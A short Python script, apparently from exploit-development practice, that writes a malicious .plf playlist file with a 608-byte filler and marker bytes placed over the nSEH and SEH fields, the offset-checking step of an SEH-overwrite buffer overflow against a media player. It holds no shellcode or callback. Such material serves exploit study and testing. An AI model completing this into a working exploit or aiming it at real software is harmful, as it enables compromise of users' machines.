#!/usr/bin/env python

filename="overwritingSEH&nSEH.plf"
#buffer = "A"*608 + [nSEH] + [SEH] + "D"*1384
buffer = "A"*608 + "B"*4 + "C"*4 + "D"*1384
textfile = open(filename, 'w')
textfile.write(buffer)
textfile.close()